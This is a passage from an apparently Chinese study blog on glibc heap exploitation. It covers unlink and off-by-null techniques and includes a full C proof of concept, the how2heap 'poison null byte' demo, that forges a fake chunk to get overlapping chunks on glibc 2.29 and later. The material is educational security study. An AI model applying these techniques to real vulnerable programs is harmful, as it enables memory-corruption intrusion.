class="number">-0x18</span></span><br></pre></td></tr></table></figure><p>从利用原理不难看出,利用的一个前提是我们要能够知道该堆块指针的地址(最好是在bss段)</p><p>自己粗糙地画了一幅图,是全部操作完成后的示意图</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-28_213612.png" alt=""></p><p>可以看到本来指向heap地ptr1指针,指向了自己地址的-0x18处</p><details class="folding-tag" yellow><summary> 关于指针加减法 </summary>              <div class='content'>              <p>其实&amp;ptr1-0x18这类写法是不正确的，这样写真正代表的意思是ptr1的地址加上0x18*sizeof(&amp;ptr1所指向的类型)</p><p>一定要这样写的话应该是(long long)&amp;ptr1-0x18</p>              </div>            </details><hr><p>还有一些特殊的利用中</p><p>会使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd=p;</span><br><span class="line">p-&gt;bk=p;</span><br></pre></td></tr></table></figure><p>来绕过unlink检测</p><hr><p><strong><em><u>重点!!!:</u></em></strong></p><p>unlink过程中使用的chunk地址<strong>是chunk真实起始地址</strong>,而不是用户可用区域地址,</p><p>但是<strong>程序</strong>变量中存储的一般是<strong>用户可用区域指针</strong>,所以大多时候都需要用到fake chunk(单纯只是要绕过检查的话不用)</p><p>所以一定要在真实chunk后立即伪造一个chunk紧跟其后(记得绕过<code>chunksize (p) != prev_size (next_chunk (p))</code>),并修改触发unlink的那个chunk,使得最终被unlink的chunk是这个伪造的chunk,那么其计算得到的伪真实地址其实就是真正的用户可用地址,从而与全局变量相对应</p><p>unlink后新产生的chunk会被链入unsorted bin</p><hr><h1 id="off—by—one"><a href="#off—by—one" class="headerlink" title="off—by—one"></a>off—by—one</h1><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>其又分为两种</p><ol><li><strong>off-by-one</strong></li><li><strong>off-by-null</strong></li></ol><p>其中第一类包含第二类,比赛中遇到的更多是第二类</p><p>此处重点学习一下off-by-null的利用</p><h2 id="2-29以前"><a href="#2-29以前" class="headerlink" title="2.29以前"></a>2.29以前</h2><p>2.29以前，利用off by null只需要：</p><ol><li>chunk A已被释放，且可以unlink</li><li>伪造C.prevsize, 并且off by null覆盖prev_inuse为0</li></ol><p>那么在释放chunk C时就可打出后向合并，从而造成合并后的chunk ABC 和chunk B重叠。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/6d998bce-aea9-4b27-8aa2-f7b81087fc20.png" alt=""></p><h2 id="2-29及以后"><a href="#2-29及以后" class="headerlink" title="2.29及以后"></a>2.29及以后</h2><p>2.29及以后,free中新增了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize)); <span class="comment">// 获取前一块chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize)) <span class="comment">// 新加的检查。前一块chunk的size和prevsize要相等。</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此如果是off by one的任意字节写，那么可以把A.size伪造成A.size+B.size。但是仅仅是写0字节就没有办法直接伪造成功。</p><p>因此需要<strong>伪造一个chunk p，这样就很容易可以绕过chunksize(p) != prevsize检查</strong>。</p><p>但由于是伪造的chunk，所以需要手动构造fd、bk以满足unlink的条件。</p><h3 id="构造unlink条件的思路"><a href="#构造unlink条件的思路" class="headerlink" title="构造unlink条件的思路"></a>构造unlink条件的思路</h3><p>如果可以得到堆地址就可以直接在堆上构造fake double-linked list。</p><p>大多数情况下得不到堆地址就可以通过堆机制残留下来的堆地址做部分写入来构造 fake double-linked list。这个过程中存在以下两个难点。</p><h4 id="难点1-多写入的0字节"><a href="#难点1-多写入的0字节" class="headerlink" title="难点1 多写入的0字节"></a>难点1 多写入的0字节</h4><p>off by null默认会多写入一个0字节，意味着，最少要覆盖2字节。比如要部分写fd时，read最少读入一个字节，实际因为off by null还会多追加1个0字节，这样fd的低第2位为\x00，即0x????00??。很多情况下，因为低第2字节不完全可控(aslr)，所以我们希望只部分写1个字节。</p><h4 id="难点2-保存fd指针"><a href="#难点2-保存fd指针" class="headerlink" title="难点2 保存fd指针"></a>难点2 保存fd指针</h4><p>从unsortedbin 双向链表里面取出来一个chunk时，fd指针会被破坏。</p><h3 id="爆破法"><a href="#爆破法" class="headerlink" title="爆破法"></a>爆破法</h3><p>公开的高版本off by null利用方法大多是用的爆破法。这里介绍how2heap的思路，其他爆破法的主要思路和how2heap的做法类似，此处不一一展开。</p><p>这个方法所谓爆破主要体现在1/16爆破目标chunk的倒数第4个十六进制位为0,后3位可控</p><p>因为tcache的存在,其实就是要求heap基址结束为0xf000</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>伪造一个chunk p，其中size按布局来调整。</p><p>通过largebin的fd_nextsize，bk_nextsize指针来同时伪造p-&gt;fd, p-&gt;bk。通过unsortedbin的fd，bk指针来做部分写入，改为p。</p><p>为了解决难点1，通过堆布局使得 chunk p （即做unlink的chunk）的地址为 0x?????0??。然后再1/16的概率爆破成0x????00??。这样做可以方便在部分写入时，很容易写成p。</p><p>为了解决难点2，通过把unsortedbin整理到largebin的方式来保存fd指针。</p><h4 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h4><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/19594e1c-721c-4dbc-8743-a7cd52354a60.png" alt=""></p><p>目标是free victim可以合并p：</p><ol><li>p满足unlink条件构造。即 b&lt;-&gt;p&lt;-&gt;a 双向链表（不需要设置 b-&gt;bk和a-&gt;fd）</li><li>p.size == victim.prev_size</li></ol><h4 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h4><h5 id="步骤1-申请chunk，低第2字节对齐"><a href="#步骤1-申请chunk，低第2字节对齐" class="headerlink" title="步骤1 申请chunk，低第2字节对齐"></a>步骤1 申请chunk，低第2字节对齐</h5><p>依次申请上图几个chunk。</p><p>注意，要让目标chunk即prev低第2字节为00. 即0x????00??。低3位可控，爆破第4位为0，1/16概率。</p><p>最终 fake p的低2字节是0x0010。</p><h5 id="步骤2设置fake-chunk，p-gt-fd-a，p-gt-bk-b-p-size-0x501"><a href="#步骤2设置fake-chunk，p-gt-fd-a，p-gt-bk-b-p-size-0x501" class="headerlink" title="步骤2设置fake chunk，p-&gt;fd=a，p-&gt;bk=b, p.size=0x501"></a>步骤2设置fake chunk，p-&gt;fd=a，p-&gt;bk=b, p.size=0x501</h5><p>依次free a, b, prev。完成unsortedbin: prev-&gt;b-&gt;a布局。</p><p>申请大chunk，把三个chunk放到largebin中。其中b-&gt;fd=a被保留下来???</p><p>根据size排序 largebin: b-&gt;prev-&gt;a。</p><p>取出prev，则prev-&gt;fd_nextsize=a，prev-&gt;bk_nextsize=b完成布局。</p><p>因为p = prev+0x10，所以p-&gt;fd = a, p-&gt;bk = b</p><h5 id="步骤3设置b-gt-fd-p"><a href="#步骤3设置b-gt-fd-p" class="headerlink" title="步骤3设置b-&gt;fd=p"></a>步骤3设置b-&gt;fd=p</h5><p>完成第2步后，largebin: b-&gt;a.</p><p>此时b-&gt;fd=a。取出b并部分写fd指针为p。因为p的低第2字节是\x00，所以这里可以正常覆盖\x10\x00。</p><h5 id="步骤4设置a-gt-bk-p"><a href="#步骤4设置a-gt-bk-p" class="headerlink" title="步骤4设置a-&gt;bk=p"></a>步骤4设置a-&gt;bk=p</h5><p>取出a，再次放到unsortedbin中，再放入victim。此时unsortedbin: victim-&gt;a</p><p>再次取出a，部分写bk指针为p。此处同步骤3。</p><p>至此完成unlink条件的构造。</p><h5 id="步骤5-伪造prev-size和prev-inuse"><a href="#步骤5-伪造prev-size和prev-inuse" class="headerlink" title="步骤5 伪造prev_size和prev_inuse"></a>步骤5 伪造prev_size和prev_inuse</h5><p>把victim申请回来,再伪造prev_size, off by null填充size 的prev_inuse位。(how2heap中是在步骤2伪造prev_size，实际上在这里伪造，顺带覆盖prev_inuse更符合实际操作，不过这也无伤大雅)</p><p>最后free victim触发合并。</p><h4 id="详细代码"><a href="#详细代码" class="headerlink" title="详细代码"></a>详细代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to poison null byte!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Some of the implementation details are borrowed from https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step1: allocate padding</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step1: allocate a large padding so that the fake chunk&#x27;s addresses&#x27;s lowest 2nd byte is \\x00&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line">    <span class="type">void</span> *heap_base = (<span class="type">void</span> *)((<span class="type">long</span>)tmp &amp; (~<span class="number">0xfff</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, heap_base);</span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0x10000</span> - ((<span class="type">long</span>)tmp&amp;<span class="number">0xffff</span>) - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calculate padding chunk size: 0x%lx\n&quot;</span>, size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocate the padding. This is required to avoid a 4-bit bruteforce because we are going to overwrite least significant two bytes.&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *padding= <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step2: allocate prev chunk and victim chunk</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nStep2: allocate two chunks adjacent to each other.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s call the first one &#x27;prev&#x27; and the second one &#x27;victim&#x27;.&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="type">void</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev chunk: malloc(0x500) = %p\n&quot;</span>, prev);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim chunk: malloc(0x4f0) = %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step3: link prev into largebin</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nStep3: Link prev into largebin&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This step is necessary for us to forge a fake chunk later&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The fd_nextsize of prev and bk_nextsize of prev will be the fd and bck pointers of the fake chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;allocate a chunk &#x27;a&#x27; with size a little bit smaller than prev&#x27;s&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a: malloc(0x4f0) = %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;allocate a chunk &#x27;b&#x27; with size a little bit larger than prev&#x27;s&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b: malloc(0x510) = %p\n&quot;</span>, b);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nCurrent Heap Layout\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    ... ...\n&quot;</span></span><br><span class="line">         <span class="string">&quot;padding\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    prev Chunk(addr=0x??0010, size=0x510)\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  victim Chunk(addr=0x??0520, size=0x500)\n&quot;</span></span><br><span class="line">         <span class="string">&quot; barrier Chunk(addr=0x??0a20, size=0x20)\n&quot;</span></span><br><span class="line">         <span class="string">&quot;       a Chunk(addr=0x??0a40, size=0x500)\n&quot;</span></span><br><span class="line">         <span class="string">&quot; barrier Chunk(addr=0x??0f40, size=0x20)\n&quot;</span></span><br><span class="line">         <span class="string">&quot;       b Chunk(addr=0x??0f60, size=0x520)\n&quot;</span></span><br><span class="line">         <span class="string">&quot; barrier Chunk(addr=0x??1480, size=0x20)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now free a, b, prev&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;current unsorted_bin:  header &lt;-&gt; [prev, size=0x510] &lt;-&gt; [b, size=0x520] &lt;-&gt; [a, size=0x500]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocate a huge chunk to enable sorting&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;current large_bin:  header &lt;-&gt; [b, size=0x520] &lt;-&gt; [prev, size=0x510] &lt;-&gt; [a, size=0x500]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This will add a, b and prev to largebin\nNow prev is in largebin&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The fd_nextsize of prev points to a: %p\n&quot;</span>, ((<span class="type">void</span> **)prev)[<span class="number">2</span>]+<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The bk_nextsize of prev points to b: %p\n&quot;</span>, ((<span class="type">void</span> **)prev)[<span class="number">3</span>]+<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step4: allocate prev again to construct fake chunk</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nStep4: Allocate prev again to construct the fake chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Since large chunk is sorted by size and a&#x27;s size is smaller than prev&#x27;s,&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;we can allocate 0x500 as before to take prev out&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *prev2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev2: malloc(0x500) = %p\n&quot;</span>, prev2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now prev2 == prev, prev2-&gt;fd == prev2-&gt;fd_nextsize == a, and prev2-&gt;bk == prev2-&gt;bk_nextsize == b&quot;</span>);</span><br><span class="line">    assert(prev == prev2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The fake chunk is contained in prev and the size is smaller than prev&#x27;s size by 0x10&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So set its size to 0x501 (0x510-0x10 | flag)&quot;</span>);</span><br><span class="line">    ((<span class="type">long</span> *)prev)[<span class="number">1</span>] = <span class="number">0x501</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check&quot;</span>);</span><br><span class="line">    *(<span class="type">long</span> *)(prev + <span class="number">0x500</span>) = <span class="number">0x500</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The fake chunk should be at: %p\n&quot;</span>, prev + <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;use prev&#x27;s fd_nextsize &amp; bk_nextsize as fake_chunk&#x27;s fd &amp; bk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we have fake_chunk-&gt;fd == a and fake_chunk-&gt;bk == b&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step5: bypass unlinking</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nStep5: Manipulate residual pointers to bypass unlinking later.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Take b out first by allocating 0x510&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *b2 = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Because of the residual pointers in b, b-&gt;fd points to a right now: %p\n&quot;</span>, ((<span class="type">void</span> **)b2)[<span class="number">0</span>]+<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can overwrite the least significant two bytes to make it our fake chunk.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;If the lowest 2nd byte is not \\x00, we need to guess what to write now\n&quot;</span>);</span><br><span class="line">    ((<span class="type">char</span>*)b2)[<span class="number">0</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">    ((<span class="type">char</span>*)b2)[<span class="number">1</span>] = <span class="string">&#x27;\x00&#x27;</span>;  <span class="comment">// b-&gt;fd &lt;- fake_chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the overwrite, b-&gt;fd is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="type">void</span> **)b2)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;To do the same to a, we can move it to unsorted bin first&quot;</span></span><br><span class="line">            <span class="string">&quot;by taking it out from largebin and free it into unsortedbin&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *a2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">    <span class="built_in">free</span>(a2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now free victim into unsortedbin so that a-&gt;bck points to victim&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(victim);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a-&gt;bck: %p, victim: %p\n&quot;</span>, ((<span class="type">void</span> **)a)[<span class="number">1</span>], victim);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Again, we take a out and overwrite a-&gt;bck to fake chunk&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *a3 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">    ((<span class="type">char</span>*)a3)[<span class="number">8</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">    ((<span class="type">char</span>*)a3)[<span class="number">9</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the overwrite, a-&gt;bck is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="type">void</span> **)a3)[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// pass unlink_chunk in malloc.c:</span></span><br><span class="line">    <span class="comment">//      mchunkptr fd = p-&gt;fd;</span></span><br><span class="line">    <span class="comment">//      mchunkptr bk = p-&gt;bk;</span></span><br><span class="line">    <span class="comment">//      if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span></span><br><span class="line">    <span class="comment">//          malloc_printerr (&quot;corrupted double-linked list&quot;);</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And we have:\n&quot;</span></span><br><span class="line">         <span class="string">&quot;fake_chunk-&gt;fd-&gt;bk == a-&gt;bk == fake_chunk\n&quot;</span></span><br><span class="line">         <span class="string">&quot;fake_chunk-&gt;bk-&gt;fd == b-&gt;fd == fake_chunk\n&quot;</span></span><br><span class="line">         );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step6: add fake chunk into unsorted bin by off-by-null</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nStep6: Use backward consolidation to add fake chunk into unsortedbin&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Take victim out from unsortedbin&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *victim2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, victim2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;off-by-null into the size of vicim&quot;</span>);</span><br><span class="line">    <span class="comment">/* VULNERABILITY */</span></span><br><span class="line">    ((<span class="type">char</span> *)victim2)[<span class="number">-8</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    <span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now if we free victim, libc will think the fake chunk is a free chunk above victim\n&quot;</span></span><br><span class="line">            <span class="string">&quot;It will try to backward consolidate victim with our fake chunk by unlinking the fake chunk then\n&quot;</span></span><br><span class="line">            <span class="string">&quot;add the merged chunk into unsortedbin.&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;For our fake chunk, because of what we did in step4,\n&quot;</span></span><br><span class="line">            <span class="string">&quot;now P-&gt;fd-&gt;bk(%p) == P(%p), P-&gt;bk-&gt;fd(%p) == P(%p)\n&quot;</span></span><br><span class="line">            <span class="string">&quot;so the unlink will succeed\n&quot;</span>, ((<span class="type">void</span> **)a3)[<span class="number">1</span>], prev, ((<span class="type">void</span> **)b2)[<span class="number">0</span>], prev);</span><br><span class="line">    <span class="built_in">free</span>(victim);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;After freeing the victim, the new merged chunk is added to unsorted bin&quot;</span></span><br><span class="line">            <span class="string">&quot;And it is overlapped with the prev chunk&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step7: validate the chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now let&#x27;s validate the chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *merged = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;merged: malloc(0x100) = %p\n&quot;</span>, merged);</span><br><span class="line">    <span class="built_in">memset</span>(merged, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now merged&#x27;s content: %s\n&quot;</span>, (<span class="type">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Overwrite prev&#x27;s content&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(prev2, <span class="string">&#x27;C&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;merged&#x27;s content has changed to: %s\n&quot;</span>, (<span class="type">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">    assert(<span class="built_in">strstr</span>(merged, <span class="string">&quot;CCCCCCCCC&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="一个问题"><a href="#一个问题" class="headerlink" 